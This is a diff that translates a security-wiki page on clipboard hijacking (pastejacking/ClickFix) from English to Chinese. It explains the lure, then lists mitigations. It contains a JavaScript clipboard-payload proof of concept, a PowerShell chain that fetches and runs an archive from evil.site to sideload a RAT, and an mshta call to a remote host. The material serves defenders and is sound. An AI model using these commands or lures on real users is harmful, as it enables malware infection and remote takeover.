@@ -1,16 +1,16 @@
-# Clipboard Hijacking (Pastejacking) Attacks
+# 剪贴板劫持（Pastejacking）攻击
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > "永远不要粘贴你没有自己复制的内容。" – 虽然老旧但仍然有效的建议
 
-## Overview
+## 概述
 
-Clipboard hijacking – 也称为 *pastejacking* – 利用用户常常在不检查的情况下复制和粘贴命令的事实。一个恶意网页（或任何支持JavaScript的环境，如Electron或桌面应用程序）以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常通过精心设计的社会工程指令被鼓励按下 **Win + R**（运行对话框）、**Win + X**（快速访问/PowerShell），或打开终端并 *粘贴* 剪贴板内容，立即执行任意命令。
+剪贴板劫持 – 也称为 *pastejacking* – 利用用户常常在不检查的情况下复制和粘贴命令的事实。恶意网页（或任何支持JavaScript的环境，如Electron或桌面应用程序）以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常通过精心设计的社会工程指令被鼓励按下 **Win + R**（运行对话框）、**Win + X**（快速访问/PowerShell），或打开终端并 *粘贴* 剪贴板内容，从而立即执行任意命令。
 
-因为 **没有文件被下载，也没有附件被打开**，该技术绕过了大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此，该攻击在传播商品恶意软件家族（如NetSupport RAT、Latrodectus loader或Lumma Stealer）的网络钓鱼活动中非常流行。
+因为 **没有文件被下载，也没有附件被打开**，该技术绕过了大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此，该攻击在传播商品恶意软件家族（如NetSupport RAT、Latrodectus loader或Lumma Stealer）的钓鱼活动中非常流行。
 
-## JavaScript Proof-of-Concept
+## JavaScript 概念验证
 ```html
 <!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
 <button id="fix" onclick="copyPayload()">Fix the error</button>
@@ -22,7 +22,7 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-较早的攻击使用 `document.execCommand('copy')`，而较新的攻击依赖于异步 **Clipboard API** (`navigator.clipboard.writeText`)。
+较早的活动使用 `document.execCommand('copy')`，而较新的活动依赖于异步 **Clipboard API** (`navigator.clipboard.writeText`)。
 
 ## ClickFix / ClearFake 流程
 
@@ -40,8 +40,8 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (合法的 Java WebStart) 在其目录中搜索 `msvcp140.dll`。
-* 恶意 DLL 动态解析 API 使用 **GetProcAddress**，通过 **curl.exe** 下载两个二进制文件 (`data_3.bin`, `data_4.bin`)，使用滚动 XOR 密钥 `"https://google.com/"` 解密它们，注入最终的 shellcode 并将 **client32.exe** (NetSupport RAT) 解压到 `C:\ProgramData\SecurityCheck_v1\`。
+* `jp2launcher.exe`（合法的 Java WebStart）在其目录中搜索 `msvcp140.dll`。
+* 恶意 DLL 动态解析 API 使用 **GetProcAddress**，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`，`data_4.bin`），使用滚动 XOR 密钥 `"https://google.com/"` 解密它们，注入最终的 shellcode 并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。
 
 ### Latrodectus Loader
 ```
@@ -70,12 +70,13 @@ mshta https://iplogger.co/xxxx =+\\xxx
 
 1. 浏览器强化 – 禁用剪贴板写入访问 (`dom.events.asyncClipboard.clipboardItem` 等) 或要求用户手势。
 2. 安全意识 – 教用户 *输入* 敏感命令或先将其粘贴到文本编辑器中。
-3. PowerShell 受限语言模式 / 执行策略 + 应用程序控制以阻止任意单行命令。
+3. PowerShell 受限语言模式 / 执行策略 + 应用控制以阻止任意单行命令。
 4. 网络控制 – 阻止对已知粘贴劫持和恶意软件 C2 域的出站请求。
 
 ## 相关技巧
 
 * **Discord 邀请劫持** 通常在诱使用户进入恶意服务器后滥用相同的 ClickFix 方法：
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
